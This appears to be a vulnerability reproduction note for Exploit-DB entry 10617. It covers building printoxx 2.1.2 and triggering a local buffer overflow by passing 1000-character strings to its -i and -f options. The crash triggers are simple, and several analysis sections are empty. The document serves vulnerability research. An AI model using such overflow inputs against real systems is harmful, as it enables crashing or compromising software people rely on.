# EDB-10617

## Experiment Environment

Ubuntu 11.04

## INSTALL & Configuration

```
wget https://github.com/mudongliang/source-packages/blob/master/EDB-10617/printoxx-2.1.2.tar.gz
tar -xvf printoxx-2.1.2.tar.gz
cd printoxx-2.1.2
make
```

## Problems in Installation & Configuration


## How to trigger vulnerability

```
Image filename overflow:
 
./printoxx -i $(python -c 'print "A"*1000')
 
Directory filename overflow:

./printoxx -f $(python -c 'print "A"*1000')
```

## PoCs

[Printoxx - Local Buffer Overflow (PoC)](https://www.exploit-db.com/exploits/10617/)

## Vulnerability Details & Patch

### Root Cause

### Stack Trace

## References
